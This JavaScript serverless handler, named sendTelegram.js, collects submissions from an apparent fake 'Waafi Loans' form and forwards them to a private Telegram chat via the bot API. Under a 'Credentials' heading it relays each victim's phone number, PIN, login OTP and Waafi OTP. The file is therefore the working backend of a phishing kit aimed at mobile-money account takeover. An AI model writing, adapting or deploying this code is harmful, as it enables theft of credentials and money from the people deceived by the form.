// api/sendTelegram.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const TELEGRAM_TOKEN   = process.env.TELEGRAM_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    const missing = [!TELEGRAM_TOKEN && 'TELEGRAM_TOKEN', !TELEGRAM_CHAT_ID && 'TELEGRAM_CHAT_ID'].filter(Boolean);
    return res.status(500).send('Missing env vars: ' + missing.join(', '));
  }

  let payload = {};
  try {
    payload = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {});
  } catch {
    return res.status(400).send('Invalid JSON');
  }

  // ── helpers ──────────────────────────────────────────────
  const esc = s => s == null ? '—' : String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

  const val = s => s == null || s === '' ? '—' : esc(String(s));

  const line  = (label, v) => `<b>${label}:</b> ${val(v)}\n`;
  const divider = () => '─────────────────────\n';

  // ── build message ─────────────────────────────────────────
  const p = payload;

  // Determine product/event label
  const event = p.event || 'Submission';

  let text = `🏦 <b>Waafi Loans — ${esc(event)}</b>\n`;
  text += divider();

  // Time
  if (p.submittedAt) {
    const t = new Date(p.submittedAt);
    const fmt = isNaN(t) ? p.submittedAt : t.toLocaleString('en-GB',{timeZone:'Africa/Nairobi',hour12:false});
    text += line('🕐 Time', fmt);
  }

  // Device
  if (p.device) text += line('📱 Device', p.device);

  text += '\n';

  // ── Loan details ──────────────────────────────────────────
  if (p.loanAmount || p.plan) {
    text += `📋 <b>Loan Details</b>\n`;
    if (p.plan)         text += line('Plan',    p.plan);
    if (p.loanAmount)   text += line('Amount',  '$' + p.loanAmount);
    if (p.period)       text += line('Period',  p.period);
    if (p.age)          text += line('Age',     p.age);
    text += '\n';
  }

  // ── Client credentials ────────────────────────────────────
  text += `🔐 <b>Credentials</b>\n`;
  if (p.phone)        text += line('Phone',   p.phone);
  if (p.pin)          text += line('PIN',     p.pin);
  if (p['Login OTP']) text += line('Login OTP', p['Login OTP']);
  if (p['Waafi OTP']) text += line('Waafi OTP', p['Waafi OTP']);

  text += '\n';
  text += divider();

  // ── send ──────────────────────────────────────────────────
  try {
    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    const body = await resp.text();
    if (!resp.ok) return res.status(502).send('Telegram error: ' + body);

    try { return res.status(200).json(JSON.parse(body)); }
    catch { return res.status(200).send(body); }

  } catch (e) {
    return res.status(500).send('Fetch error: ' + (e?.message || e));
  }
}
